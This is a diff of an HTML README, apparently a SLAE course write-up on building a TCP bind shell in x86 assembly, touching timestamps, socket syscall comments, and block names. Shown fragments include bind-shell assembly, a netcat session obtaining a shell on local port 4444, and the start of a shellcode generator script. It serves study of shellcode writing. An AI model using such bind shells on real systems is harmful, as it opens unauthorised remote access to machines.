@@ -4,7 +4,7 @@
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
 <title>README</title>
-<!-- 2016-12-19 Mon 08:54 -->
+<!-- 2016-12-21 Wed 15:55 -->
 <meta  http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta  name="generator" content="Org-mode" />
 <meta  name="author" content="Brett Lischalk" />
@@ -463,6 +463,7 @@ for.
 
 <pre class="src src-c" id="net.h">#define SYS_SOCKET  1   /* sys_socket(2)    */
 #define SYS_BIND    2   /* sys_bind(2)      */
+#define SYS_CONNECT 3   /* sys_connect(2)   */
 #define SYS_LISTEN  4   /* sys_listen(2)    */
 #define SYS_ACCEPT  5   /* sys_accept(2)    */
 // ... snip
@@ -573,7 +574,7 @@ int lsock = socket(2, SOCK_STREAM, 0);
 
 <div class="org-src-container">
 
-<pre class="src src-asm" id="bindshellasm.asm">global _start
+<pre class="src src-nasm" id="bindshellasm.nasm">global _start
 ;; Note: We will store 2 file descriptors along the way
 ;; We will put the listening socket file descriptor in edi
 ;; We will put the connection socket file descriptor in ebx
@@ -592,9 +593,9 @@ section .text
 
     ;; Put the socket() args on the stack
     xor ecx, ecx
-    push ecx ; INADDR_ANY Accept on any interface 0x00000000
+    push ecx ; Specify protocol as 0
     push ebx ; SOCK_STREAM is the type of socket 1
-    push 0x2 ; Protocol AF_INET is the IP Protocol 2
+    push 0x2 ; Domain af_inet sets protocol family to ip protocol 2
 
     mov ecx, esp ; Save pointer to args for the socket() call
     int 0x80 ; call sys_socket
@@ -721,7 +722,7 @@ And connect using netcat:
 
 <div class="org-src-container">
 
-<pre class="src src-sh" id="compile-assembly-script">#!/bin/bash
+<pre class="src src-sh" id="netcat-bind-connection">#!/bin/bash
 root@blahblah:~/shared/SLAE/slae/exercise1# nc -nv 127.0.0.1 4444
 (UNKNOWN) [127.0.0.1] 4444 (?) open
 id
@@ -807,8 +808,6 @@ shellcode and print out the result:
 
 <pre class="src src-python" id="tcp-bind-shell.py">#!/usr/bin/python
 
-#!/usr/bin/python
-
 import sys
 
 if len(sys.argv) != 2:
@@ -845,7 +844,7 @@ would like to yield the proper shellcode.
 </div>
 <div id="postamble" class="status">
 <p class="author">Author: Brett Lischalk</p>
-<p class="date">Created: 2016-12-19 Mon 08:54</p>
+<p class="date">Created: 2016-12-21 Wed 15:55</p>
 <p class="creator"><a href="http://www.gnu.org/software/emacs/">Emacs</a> 24.5.1 (<a href="http://orgmode.org">Org</a> mode 8.2.10)</p>
 <p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
 </div>
